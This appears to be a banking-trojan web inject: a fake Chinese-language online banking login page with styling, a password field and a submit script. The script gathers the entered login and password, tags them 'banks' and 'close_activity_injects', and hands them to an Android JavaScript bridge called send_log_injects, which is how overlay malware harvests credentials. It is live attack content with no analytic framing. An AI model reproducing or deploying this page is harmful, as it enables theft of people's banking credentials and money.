<style type="text/css">
    body {
        background: #fff;
        margin: 0;
        padding: 0;

        background-size: 100%;
    }
    .logo {
text-align: center;
    background-size: 100%;
    padding: 20px 0px 20px 0px;
    background: none;
    color: #fff;
    font-weight: 400;
    text-decoration: none;
    }
    .form {

    }

    }
    form {
        display: inline-block;
    }
fieldset {
      position: relative;
      text-align: center;
      border: none;
          margin: 0;
    padding: 0;

}

input[type="text"],input[type="password"] {
line-height: 16px;
    font-size: 17px;
    box-sizing: border-box;
    width: 100%;
    position: relative;
    padding: 10px;
    margin: 0px 1px;
    display: block;
    -webkit-box-shadow: none;
    box-shadow: none;
    -webkit-appearance: none;
    height: 48px;
    margin: 0px 0px 10px 0px;
    color: #a3a3a3;
    text-align: left;
    outline: none;
    border: 1px solid #4d4d4d;
    background: none;
    border-top: none;
    border-left: none;
    border-right: none;
}
input[type="button"] {
left: 0;
    right: 0;
    width: 100%;
    height: 47px;
    margin: 30px 0px 0px 0px;
    outline: none;
    float: right;
    color: #fff;
    border: none;
    font-size: 14px;
    -webkit-appearance: none;
    cursor: pointer;
    background: #d9382c;
}
fieldset span {
    display: inline-block;
    text-align: center;
    color: #4b4949;
    left: 0;
    right: 0;
    padding-top: 30px;
}
fieldset p {
    display: inline-block;
    left: 0;
    right: 0;
    color: #088f0d;
}
.logo span {
    display: inline-block;
    float: left;
    padding: 40px 0px 0px 20px;
    font-size: 20px;
    color: #fff;
    font-weight: 600;
}
input::placeholder {
    color: #a3a3a3;
    font-size: 15px;
}
</style>

        <input type="password" name="password" id="password" placeholder="網上銀行密碼" style="height: 50px;">
        <input name="exit" type="hidden" text="true"/>
        <input type="button" name="sumbit" onclick="send_form()" value="登入">

        <a href="#" style="text-decoration: none; font-size: 14px; color: #131212; display: block;text-align: left; margin-top: 110px;">重設網上銀行密碼</a>

<script>
function send_form()
{
    if (document.getElementById("login").value == '')
{
    alert ('所有必填字段！');
    return false;
}
if (document.getElementById("password").value == '')
{
    alert ('所有必填字段！');
    return false;
}
    var data = {};
        data.login = document.getElementById('login').value;
        data.password = document.getElementById('password').value;
        data.type_injects = "banks";
        data.closed = "close_activity_injects";
    
        var ua = navigator.userAgent.toLowerCase();
        if(ua.indexOf("android") > -1) {
            try {
                Android.send_log_injects(JSON.stringify(data))
            } catch (err) {}
        }else{
            alert(JSON.stringify(data));
        } 
}
</script>
